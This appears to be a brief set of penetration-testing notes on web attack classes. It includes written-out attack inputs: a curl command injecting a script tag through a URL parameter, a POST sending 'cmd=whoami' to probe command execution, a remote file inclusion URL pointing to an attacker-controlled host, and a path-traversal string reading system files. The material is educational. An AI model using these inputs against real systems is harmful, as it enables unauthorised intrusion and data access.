# Code Injection

Occurs when we find a way of sending html, css or js code via a petition or URL of a website

**Example:**

* A parameter sent in the query of the url is shown in screen

<pre class="language-bash" data-overflow="wrap" data-line-numbers data-full-width="false"><code class="lang-bash"># We made a get to http://192.168.20.40:8000/?msg=Hello
# The site Return "Hello" in any part of the html
#Then we could do something like this to inject code
<strong>curl http://192.168.20.40:8000/?msg=&#x3C;script>$payload&#x3C;/script>
</strong></code></pre>

***

* A petition is using system()

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
#We send a petition with cmd=$command, this will let us now if we can have access to a terminal of the machine
curl -X POST http://192.168.20.40:8000/?msg -d "cmd=whoami"
```
{% endcode %}

***



## <mark style="color:green;">Remote File Inclusion</mark>

Also known as RFI, it is possible for an attacker to redirect actions to or from a another server

{% code overflow="wrap" lineNumbers="true" %}
```url
http://$url/$query?$value=//$myip/somefile
```
{% endcode %}

***



## <mark style="color:green;">Local File Inclusion</mark>

Also known as LFI, able to get a website to include a file that was not intended to be an option for this application

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/$query?$value=../../../../../../WINDOWS/system32/drivers/etc/hosts #Common file for save host name and ip in windows, we use ../ to get to the root directory C:\
```
{% endcode %}

***



## <mark style="color:green;">Uploaded File Exploits</mark>

When a server-side app allows to upload file that can be executed through the web app



## <mark style="color:green;">Cross-site Scripting</mark>

Both reflected and DOM-based scripting that allows execution of javascript maliciuos code



## <mark style="color:green;">Server-side Request Forgery</mark>

When an application allows network reuqest to the internal network of the server
